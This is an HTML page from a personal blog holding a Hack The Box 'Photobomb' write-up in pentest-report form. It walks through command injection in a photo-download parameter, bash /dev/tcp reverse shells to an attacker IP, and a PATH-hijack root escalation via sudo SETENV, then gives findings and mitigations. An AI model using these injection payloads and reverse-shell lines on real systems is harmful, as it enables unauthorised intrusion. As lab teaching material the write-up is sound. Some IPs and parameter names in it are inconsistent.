@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A</title>
+    <link rel="icon" href="../images/icons/A.png" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
+
+</head>
+<body>
+    <div class="topnav">
+        <div class="logo">
+            <h2>Analogman</h2>
+        </div>
+        <div class="social-links">
+            <a href="https://youtu.be/9J62hGda9BQ?si=FGMES2gz8cWz9U3k" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+        </div>
+
+        <div class="menu-icon" onclick="toggleMenu()">
+            <i class="fa fa-bars"></i>
+        </div>
+        <!-- Menú desplegable que estará oculto por defecto -->
+        <ul class="navbar">
+            <li><a href="../index.html">Home</a></li>
+            <li><a href="#">Tags</a></li>
+            <li><a href="../wp/index.html">WriteUps</a></li>
+        </ul>
+    </div>
+    <script>
+        function toggleMenu() {
+            const navbar = document.querySelector('.navbar');
+            navbar.classList.toggle('open');  
+        }
+    </script>
+    <div class="header">
+        <div class="wrapper">
+            <div class="sidebar">
+                <div class="profile">
+                    <img src="../images/profile.jpg" alt="">
+                    <h2>Analogman</h2>
+                    <h5>Hacker learner</h5>
+                </div>
+                <ul class="navbar">
+                    <li><a href="../index.html">Home</a></li>
+                    <li><a href="#">Tags</a></li>
+                    <li><a href="../wp/index.html">WriteUps</a></li>
+                </ul>
+                <div class="social">
+                    <a href="https://www.youtube.com/watch?v=9J62hGda9BQ" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+                </div>
+            </div>
+
+            <!-- writeups aquí -->
+            <div class="writeup-container">
+                <h1>Photobomb WriteUp</h1>
+                
+                <section class="content">
+                    <!-- Texto explicativo -->
+                    <div class="img-container">
+                        <img src="../images/Posts/Photobomb/Photobomb_Description.png" alt="Preview" class="machine-image">
+                    </div>
+                    
+                    <h1>1. Summary</h1>
+                    <p>This report presents the findings obtained during the security assessment performed on the system associated with the IP address `10.129.87.223`. The analysis aimed to identify potential vulnerabilities and attack vectors that could compromise the security of the system.</p>
+                    <h1>2. Introduction</h1>
+                    <p>The purpose of this document is to describe in detail the activities carried out during the security assessment of the target system, as well as the results obtained. This assessment was carried out following an ethical and controlled approach, in order to ensure the integrity, confidentiality and availability of the analyzed environment.</p>
+                    <h1>3. Methodology</h1>
+                    <p>Industry standard tools such as <strong>Nmap</strong> and <strong>Burpsuite</strong> were used for the assessment to perform enumeration and exploitation of the target system. The process strictly followed security best practices to minimize any impact on the environment.</p>
+                    <h2>3.1 Limitations:</h2>
+                    <p>This analysis focused exclusively on services accessible from the provided IP address. No testing was performed that included denial of service, social engineering, or other methods that could affect system stability or data privacy.</p>
+                    <!-- -->
+                    <h1>4. Technical details</h1>
+                    <h2>4.1 Enumeration</h2>
+                    <p>We start with the initial port scan.</p>
+                    <div class="console-code">
+                        <pre>
+$ sudo nmap -v -n -Pn 10.129.87.223 
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 03:24 EST
+Initiating SYN Stealth Scan at 03:24
+Scanning 10.129.87.223 [1000 ports]
+Discovered open port 22/tcp on 10.129.87.223
+Discovered open port 80/tcp on 10.129.87.223
+Completed SYN Stealth Scan at 03:24, 0.63s elapsed (1000 total ports)
+Nmap scan report for 10.129.87.223
+Host is up (0.037s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
+           Raw packets sent: 1000 (44.000KB) | Rcvd: 1000 (40.008KB)
+                        </pre>
+                    </div>
+                    <p>We have two ports open:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>22/tcp</strong>: ssh</li>
+                            <li><strong>80/tcp</strong>: http</li>
+                        </ul>
+                    </div>
+
+                    <p>We proceed with service version enumeration and run NSE scripts to gather information about potential service vulnerabilities or configurations.</p>
+                    <div class="console-code">
+                        <pre>
+$ sudo nmap -v -n -sCV -Pn -p 22,80 10.129.87.223
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 03:25 EST
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 03:25
+Completed NSE at 03:25, 0.00s elapsed
+Initiating NSE at 03:25
+Completed NSE at 03:25, 0.00s elapsed
+Initiating NSE at 03:25
+Completed NSE at 03:25, 0.00s elapsed
+Initiating SYN Stealth Scan at 03:25
+Scanning 10.129.87.223 [2 ports]
+Discovered open port 80/tcp on 10.129.87.223
+Discovered open port 22/tcp on 10.129.87.223
+Completed SYN Stealth Scan at 03:25, 0.05s elapsed (2 total ports)
+Initiating Service scan at 03:25
+Scanning 2 services on 10.129.87.223
+Completed Service scan at 03:25, 6.08s elapsed (2 services on 1 host)
+NSE: Script scanning 10.129.87.223.
+Initiating NSE at 03:25
+Completed NSE at 03:25, 2.13s elapsed
+Initiating NSE at 03:25
+Completed NSE at 03:25, 0.15s elapsed
+Initiating NSE at 03:25
+Completed NSE at 03:25, 0.00s elapsed
+Nmap scan report for 10.129.87.223
+Host is up (0.036s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
+|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
+|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to http://photobomb.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+Initiating NSE at 03:25
+Completed NSE at 03:25, 0.00s elapsed
+Initiating NSE at 03:25
+Completed NSE at 03:25, 0.00s elapsed
+Initiating NSE at 03:25
+Completed NSE at 03:25, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.70 seconds
+           Raw packets sent: 2 (88B) | Rcvd: 2 (88B)
+                        </pre>
+                    </div>
+                    <p><strong>Service discovery</strong></p>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>SSH</strong>: OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</li>
+                            <li><strong>HTTP</strong>: nginx 1.18.0 (Ubuntu)</li>
+                        </ul>
+                    </div>
+                    <h2>4.2 Exploitation</h2>
+                    <p>We navigate to port 80 and are redirected to the photobomb.htb domain, which we added to our /etc/hosts file, before refreshing the page.</p>
+                    <div class="console-code">
+                        <pre>
+$ echo "10.10.11.182 photobomb.htb" | sudo tee -a /etc/hosts
+                        </pre>
+                    </div>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Photobomb/1.png" alt="">
+                        <p class="caption">Web service home page</p>
+                    </div>
+                    <p>The page advertises a new premium photography franchise on the cutting-edge web. The page also has a link that redirects us to a login and that the credentials are in a kind of "welcome package."</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Photobomb/2.png" alt="">
+                    </div>
+                    <p>When inspecting the source code of the website we find a script called `photobomb.js`.</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Photobomb/3.png" alt="">
+                    </div>
+                    <p>Reading the script we find a Javascript function, which Jameson apparently left for technical support, since they keep forgetting them.</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Photobomb/4.png" alt="">
+                    </div>
+                    <p>We enter /printer and authenticate using the credentials successfully. We see a page where we can download images, choosing the desired format and dimensions.</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Photobomb/5.png" alt="">
+                    </div>
+                    <p>At this point, since we can't do anything else, we use Burpsuite to intercept the download requests (Burpsuite is a tool commonly used to perform penetration testing on web applications. BurpSuite has the ability to intercept and inspect web requests through its proxy feature, making it an essential tool for identifying vulnerabilities within web applications.)</p>
+                    <h3>Foothold</h3>
+                    <p>We proceed to intercept the download request by clicking on the `DOWNLOAD PHOTO TO PRINT` button.</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Photobomb/6.png" alt="">
+                    </div>
+                    <p>At the bottom of the request we can see the data being sent. We see three parameters: photo, filetype and dimensions. How these parameters are handled in the backend can sometimes require a combination of brute force and educated guesswork, which we'll look at next.</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Photobomb/7.png" alt="">
+                    </div>
+                    <p>The application does not return anything useful in response other than just downloading the image. We tried to inject commands by modifying the parameters being sent.</p>
+                    
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Photobomb/8.png" alt="">
+                        <img src="../images/Posts/Photobomb/9.png" alt="">
+                    </div>
+                    <p>When adding a `;` at the end of jpg and sending the request we notice that the response is longer than normal, in our case it takes 1.138 milliseconds.</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Photobomb/10.png" alt="">
+                    </div>
+                    <p>We try to inject the command `sleep 4` into this parameter. We have to urlencode the spaces so that it doesn't give us errors. It would look like this `sleep+4`.</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Photobomb/11.png" alt="">
+                        <img src="../images/Posts/Photobomb/12.png" alt="">
+                    </div>
+                    <p>We see that the response takes 5.288 millis to arrive. It seems that our command is being executed. To confirm this we can try pinging our machine. `ping -c 1 10.10.14.18` when urlencoded would look like this `ping+-c+1+10.10.14.18`.</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Photobomb/13.png" alt="">
+                    </div>
+                    <p>We listen in our machine with netcat and receive the icmp trace:</p>
+                    <div class="console-code">
+                        <pre>
+$ sudo tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+04:15:19.214005 IP photobomb.htb > 10.10.14.18: ICMP echo request, id 2, seq 1, length 64
+04:15:19.214019 IP 10.10.14.18 > photobomb.htb: ICMP echo reply, id 2, seq 1, length 64
+                        </pre>
+                    </div>
+                    <p>To try to gain access we can send a reverse shell `bash -c 'bash -i >& /dev/tcp/10.10.14.18/4444 0>&1'` to our machine. Urlencoding it would look like this `bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.18/4444+0>%261'`.</p>
+                    <p>We listen with netcat on port 4444, send the request and receive the shell as the wizard user.</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Photobomb/14.png" alt="">
+                    </div>
+                    <div class="console-code">
+                        <pre>
+$ nc -nvlp 4444                             
+listening on [any] 4444 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.129.87.223] 47704
+bash: cannot set terminal process group (693): Inappropriate ioctl for device
+bash: no job control in this shell
+
+wizard@photobomb:~/photobomb$ 
+                        </pre>
+                    </div>
+                    <h2>4.3 Privilege escalation</h2>
+                    <p>Listing our permissions with `sudo -l` command, we notice that we have permission to execute the `/opt/cleanup.sh` file as the root user.</p>
+                    <div class="console-code">
+                        <pre>
+wizard@photobomb:/tmp$ sudo -l
+Matching Defaults entries for wizard on photobomb:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User wizard may run the following commands on photobomb:
+    (root) SETENV: NOPASSWD: /opt/cleanup.sh
+                        </pre>
+                    </div>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>SETENV</strong>: Allows the user to set or modify environment variables when using `sudo`.</li>
+                        </ul>
+                    </div>
+                    <p>We read the contents of the file:</p>
+                    <div class="console-code">
+                        <pre>
+wizard@photobomb:~$ cat /opt/cleanup.sh
+#!/bin/bash
+. /opt/.bashrc
+cd /home/wizard/photobomb
+
+# clean up log files
+if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
+then
+  /bin/cat log/photobomb.log > log/photobomb.log.old
+  /usr/bin/truncate -s0 log/photobomb.log
+fi
+
+# protect the priceless originals
+find source_images -type f -name '*.jpg' -exec chown root:root {} \;
+wizard@photobomb:~$ 
+                        </pre>
+                    </div>
+                    <p>We notice at the end of the script that the `<strong>find</strong>` command is being used in a relative way; this gives us the possibility of manipulating the command as we wish, taking advantage of the fact that we can modify environment variables (Path hijacking).</p>
+                    <p>We move to the /tmp directory and create a file named `<strong>find</strong>`, using `<strong>touch find</strong>` command; we edit the file and write a reverse shell in it:</p>
+                    <div class="console-code">
+                        <pre>
+wizard@photobomb:/tmp$ cat find
+#!/bin/bash
+
+bash -c 'bash -i >& /dev/tcp/10.10.14.18/1234 0>&1'
+                        </pre>
+                    </div>
+                    <p>We give execution permissions to our file and verify:</p>
+                    <div class="console-code">
+                        <pre>
+wizard@photobomb:/tmp$ chmod +x find 
+wizard@photobomb:/tmp$ ls -al
+total 52
+drwxrwxrwt 12 root   root   4096 Dec  8 07:31 .
+drwxr-xr-x 18 root   root   4096 Sep 16  2022 ..
+-rwxr-xr-x  1 wizard wizard   65 Dec  8 07:31 find
+drwxrwxrwt  2 root   root   4096 Dec  8 05:41 .font-unix
+drwxrwxrwt  2 root   root   4096 Dec  8 05:41 .ICE-unix
+drwx------  3 root   root   4096 Dec  8 05:41 systemd-private-88236d6b16d64981ae958bfe2dd21daa-ModemManager.service-oLjs7g
+drwx------  3 root   root   4096 Dec  8 05:41 systemd-private-88236d6b16d64981ae958bfe2dd21daa-systemd-logind.service-fMI1Se
+drwx------  3 root   root   4096 Dec  8 05:41 systemd-private-88236d6b16d64981ae958bfe2dd21daa-systemd-resolved.service-1c6Jbg
+drwx------  3 root   root   4096 Dec  8 05:41 systemd-private-88236d6b16d64981ae958bfe2dd21daa-systemd-timesyncd.service-SOkkyi
+drwxrwxrwt  2 root   root   4096 Dec  8 05:41 .Test-unix
+drwx------  2 root   root   4096 Dec  8 05:41 vmware-root_667-3980363901
+drwxrwxrwt  2 root   root   4096 Dec  8 05:41 .X11-unix
+drwxrwxrwt  2 root   root   4096 Dec  8 05:41 .XIM-unix
+                        </pre>
+                    </div>
+                    <p>From our attacking machine we listen on port 1234 with netcat.</p>
+                    <div class="console-code">
+                        <pre>
+$ nc -nvlp 1234
+listening on [any] 1234 ...
+                        </pre>
+                    </div>
+                    <p>We run the `<strong>/opt/cleanup.sh</strong>` file with superuser privileges and setting our own path to take advantage of the `<strong>SETENV</strong>` permission with the command:</p>
+                    <div class="console-code">
+                        <pre>
+wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
+                        </pre>
+                    </div>
+                    <div class="console-code">
+                        <pre>
+$ nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.129.87.223] 40848
+root@photobomb:/home/wizard/photobomb# id &&ifconfig
+id &&ifconfig
+uid=0(root) gid=0(root) groups=0(root)
+eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 10.129.87.223  netmask 255.255.0.0  broadcast 10.129.255.255
+        inet6 dead:beef::250:56ff:fe94:47e2  prefixlen 64  scopeid 0x0&lt;global&gt;
+        inet6 fe80::250:56ff:fe94:47e2  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether 00:50:56:94:47:e2  txqueuelen 1000  (Ethernet)
+        RX packets 347512  bytes 45654574 (45.6 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 336546  bytes 168430210 (168.4 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 1803707  bytes 235838796 (235.8 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1803707  bytes 235838796 (235.8 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root@photobomb:/home/wizard/photobomb# 
+                        </pre>
+                    </div>
+                    <p>Finally, on our machine we receive the reverse shell as the root user, thus compromising the entire system.</p>
+                    <h1>5. Findings</h1>
+                    <p>During the security assessment of the target system with IP `10.129.87.233`, ​​two critical vulnerabilities were identified:</p>
+                    <h2>Command Injection in Parameters</h2>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>Severity</strong>: High.</li>
+                            <li><strong>Description</strong>: The application was found to allow command injection in the `<strong>typefile</strong>` parameter, which could allow an attacker to execute arbitrary commands on the server.</li>
+                            <li><strong>Impact</strong>: Remote Command Execution (<strong>RCE</strong>).</li>
+                            <li><strong>Recommendations</strong>: Implement rigorous input validations and use input sanitization techniques.</li>
+                        </ul>
+                    </div>
+                    <h2>Inadequate Permissions for `wizard` User</h2>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>Severity</strong>: Medium.</li>
+                            <li><strong>Description</strong>:The `wizard` user has excessive permissions to access critical settings that are not required for its operation.</li>
+                            <li><strong>Impact</strong>: Potential escalation of privileges.</li>
+                            <li><strong>Recommendations</strong>: Review and reduce the `wizard` user permissions to the minimum necessary.</li>
+                        </ul>
+                    </div>
+                    <h1>6. Recommendations</h1>
+                    <p>To mitigate the risks associated with the identified vulnerabilities, the following actions are suggested:</p>
+                    <h2>Mitigating Command Injection</h2>
+                    <p><strong>Proper Input Validation</strong>: Implement rigorous validation and sanitization of input parameters to prevent the execution of unwanted commands. This includes the use of whitelists for allowed values ​​and sanitization of special characters.</p>
+                    <p><strong>Use of High-Level Functions</strong>: Avoid the use of vulnerable functions that allow direct command execution. The use of security frameworks or libraries that properly manage input and prevent the execution of dangerous commands is recommended.</p>
+                    <p><strong>Principle of Least Privileges</strong>: Ensure that the process handling user input has minimal permissions, thus limiting the impact if the vulnerability is exploited.</p>
+                    <h2>Review and Correction of 'wizard' User Permissions</h2>
+                    <p>User Permissions Review: Conduct a full audit of the permissions assigned to the wizard user. Only the permissions strictly necessary for their functions should be granted.</p>
+                    <p><strong>Principle of Least Privileges</strong>: Ensure that users have only the privileges necessary to perform their tasks, restricting access to sensitive files and resources.</p>
+                    <p><strong>Monitoring and Access Control</strong>: Implement stricter access controls, such as multi-factor authentication, and regularly monitor the activities of users with elevated privileges.</p>
+                    <h1>7. Conclusion</h1>
+                    <p>The security assessment performed on the target system identified two critical vulnerabilities: command injection via input parameters and incorrect permission settings for the `wizard` user. Both vulnerabilities present significant risks, such as arbitrary command execution and privilege escalation, which could result in compromised system integrity, confidentiality, and availability.</p>
+                    <p>It is imperative that the above recommendations be implemented to mitigate these risks. Correcting these vulnerabilities will strengthen the overall security of the system and reduce the possibility of exploitation by malicious attackers.</p>
+                    <p>It is critical to perform regular security audits to detect potential new vulnerabilities and ensure that the system remains secure from emerging threats.</p>
+                    <!--Final-->
+                </section>
+            </div>
+
+        </div>
+    </div>
+    
+    <!--Pet Cat-->
+    <div class="pet-container">
+        <img src="" alt="Walking Pet" id="pet" class="pet">
+    </div>
+    <script src="script.js"></script>
+    <!--Pet Cat-->
+</body>
+</html>
